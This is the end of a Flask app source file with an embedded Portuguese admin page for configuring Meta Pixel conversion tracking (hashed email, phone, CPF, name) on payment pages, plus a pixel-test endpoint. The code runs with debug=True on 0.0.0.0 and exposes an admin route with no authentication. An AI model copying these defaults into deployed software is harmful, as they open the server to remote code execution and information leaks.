    <html>
    <head>
        <title>Configuração Meta Pixels - Prosegur</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gray-100">
        <div class="container mx-auto px-4 py-8">
            <h1 class="text-3xl font-bold mb-6">Configuração Meta Pixels</h1>
            
            <div class="bg-white rounded-lg shadow p-6 mb-6">
                <h2 class="text-xl font-semibold mb-4">Status dos Pixels</h2>
                <button onclick="testPixels()" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
                    Testar Conexão
                </button>
                <div id="test-results" class="mt-4"></div>
            </div>
            
            <div class="bg-white rounded-lg shadow p-6">
                <h2 class="text-xl font-semibold mb-4">Configuração via Secrets</h2>
                <p class="text-gray-600 mb-4">Configure os seguintes secrets no ambiente:</p>
                
                <div class="space-y-2 text-sm font-mono bg-gray-50 p-4 rounded">
                    <div>META_PIXEL_1_ID = 123456789012345</div>
                    <div>META_PIXEL_2_ID = 123456789012346</div>
                    <div>META_PIXEL_3_ID = 123456789012347</div>
                    <div>META_PIXEL_4_ID = 123456789012348</div>
                    <div>META_PIXEL_5_ID = 123456789012349</div>
                    <div>META_PIXEL_6_ID = 123456789012350</div>
                </div>
                
                <div class="mt-4 p-4 bg-blue-50 rounded">
                    <p class="text-sm text-blue-800">
                        <strong>Apenas o Pixel ID é necessário!</strong><br>
                        Não precisa de tokens de acesso. O tracking é feito via JavaScript no navegador.
                    </p>
                </div>
                
                <div class="mt-4">
                    <h3 class="font-semibold">Eventos Enviados:</h3>
                    <ul class="list-disc list-inside text-sm text-gray-600 mt-2">
                        <li>Purchase - Quando pagamento é aprovado em /pagamento</li>
                        <li>Purchase - Quando pagamento CNV é aprovado em /finalizar</li>
                        <li>Dados hasheados: email, telefone, CPF, nome, localização</li>
                    </ul>
                </div>
            </div>
        </div>
        
        <script>
        async function testPixels() {
            const resultsDiv = document.getElementById('test-results');
            resultsDiv.innerHTML = '<div class="text-blue-600">Testando conexões...</div>';
            
            try {
                const response = await fetch('/admin/test-meta-pixels');
                const data = await response.json();
                
                let html = '<div class="space-y-2">';
                if (data.success) {
                    html += `<div class="text-green-600 font-semibold">✓ ${data.successful_tests}/${data.total_pixels} pixels conectados</div>`;
                } else {
                    html += '<div class="text-red-600 font-semibold">✗ Erro nos testes</div>';
                }
                
                data.results.forEach(result => {
                    const color = result.success ? 'text-green-600' : 'text-red-600';
                    const icon = result.success ? '✓' : '✗';
                    html += `<div class="${color}">${icon} ${result.pixel_name} (${result.pixel_id}): ${result.message}</div>`;
                });
                
                html += '</div>';
                resultsDiv.innerHTML = html;
            } catch (error) {
                resultsDiv.innerHTML = '<div class="text-red-600">Erro ao testar pixels</div>';
            }
        }
        </script>
    </body>
    </html>
    ''')

@app.route('/admin/test-meta-pixels')
def test_meta_pixels():
    """Endpoint para testar configuração dos Meta Pixels"""
    try:
        tracker = MetaPixelTracker()
        result = tracker.test_pixel_configuration()
        return jsonify(result)
    except Exception as e:
        app.logger.error(f"Erro ao testar Meta Pixels: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        })

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)